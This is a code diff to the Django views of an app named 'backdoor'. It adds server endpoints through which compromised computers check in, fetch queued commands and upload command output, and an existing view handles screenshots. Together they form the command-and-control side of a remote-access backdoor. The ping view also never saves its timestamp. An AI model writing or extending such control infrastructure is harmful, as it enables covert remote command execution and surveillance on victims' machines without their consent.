@@ -58,3 +58,28 @@ def screenshot(request):
         form = ScreenShotForm()
     
     return render(request, "backdoor/screenshot.html", {'form':form})
+
+
+def ping(request, pk):
+    computer = Computer.objects.get(id=pk)
+    computer.last_online = timezone.now()
+    return JsonResponse({})
+    
+def commands(request, pk):
+    computer = Computer.objects.get(id=pk)
+    commands_dict = {}
+    commands = Command.objects.all().filter(target=computer)
+    for i in commands:
+        commands_dict[i.id] = i.command
+    return JsonResponse(commands_dict)
+
+def output(request, pk, command_id, output):
+    computer = Computer.objects.get(id=pk)
+    command = Command.objects.get(id=command_id)
+    Output.objects.create(target=computer,
+                                   output=output,
+                                   command=command.command,
+                                   time=timezone.now()
+                                    )
+    command.delete()
+    return JsonResponse({})
